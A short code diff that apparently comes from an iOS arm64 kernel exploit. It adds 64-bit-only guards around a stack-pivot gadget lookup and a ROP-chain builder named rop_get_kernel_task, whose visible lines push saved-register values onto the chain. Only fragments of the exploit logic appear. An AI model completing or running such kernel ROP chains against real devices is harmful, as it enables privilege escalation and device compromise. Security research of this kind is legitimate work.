@@ -8,7 +8,11 @@
 
 addr_t get_stack_pivot(void)
 {
+#ifdef __LP64__
     return offsets.slid.gadget_ldp_x9_add_sp_sp_0x10;
+#else
+    THROW("32-bit is not supported yet");
+#endif
 }
 
 #define PUSH(head, val) \
@@ -20,6 +24,7 @@ do \
 
 void rop_get_kernel_task(addr_t **chain, task_t *task)
 {
+#ifdef __LP64__
     // Save stack frame
     {
         // Stored at [sp, 0xf0] will be x29 of the previous
@@ -165,4 +170,7 @@ void rop_get_kernel_task(addr_t **chain, task_t *task)
         PUSH(*chain, 0xdeadbeef);               // x29 <----------------------------------------`
         PUSH(*chain, ret_addr);                 // x30
     }
+#else
+    THROW("32-bit is not supported yet");
+#endif
 }
